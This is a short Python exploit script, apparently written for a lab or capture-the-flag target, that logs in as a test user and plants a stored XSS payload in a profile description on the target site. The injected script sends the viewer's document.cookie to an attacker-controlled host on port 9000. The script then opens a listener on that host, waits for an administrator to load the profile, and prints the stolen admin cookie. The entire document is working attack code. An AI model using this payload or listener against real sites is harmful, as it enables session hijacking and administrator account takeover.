# Steal admin cookie by putting a XSS on user profile

import urllib3
import urllib
import sys
import requests
import socket

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

username = "user1"
password = "test333"

if len(sys.argv) != 2:
    print("Usage: %s <IP>" % sys.argv[0])
    print("Example: %s 172.17.0.2" % sys.argv[0])

session = requests.Session()

## Functions

def login(loginURL):

    loginParams = {"username": username, "password": password}      
    rPassword = session.post(loginURL, verify=False, proxies=proxies, data=loginParams)
    return "[MoTD]" in rPassword.text

def changeDescription(profileURL):
    descriptionBody = {"description": "<script>document.write('<img src=http://192.168.159.131:9000/'+document.cookie+' />');</script>"}
    rDescription = session.post(profileURL, verify=False, proxies=proxies, data=descriptionBody)
    return "Success" in rDescription.text

##################

url = sys.argv[1]

loginURL = "http://" + url + "/login.php"

if login(loginURL):
    print("[+] Logged in!")
else:
    print("[!] Fail to login, exiting...")
    exit()

print("[+] Changing description")

profileURL = "http://" + url + "/profile.php"

if changeDescription(profileURL):
    print("[+] Description changed!")
else:
    print("[!] Failed to change description")

# Creating listener
print("[*] Setting up listener on port 9000")
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("192.168.159.131",9000))
s.listen()

print("[*] Waiting for admin to trigger XSS...")
(sock_c, ip_c) = s.accept()
get_request = sock_c.recv(4096)
admin_cookie = get_request.split(b" HTTP")[0][5:].decode("UTF-8")

print("[+] Cookie:", admin_cookie)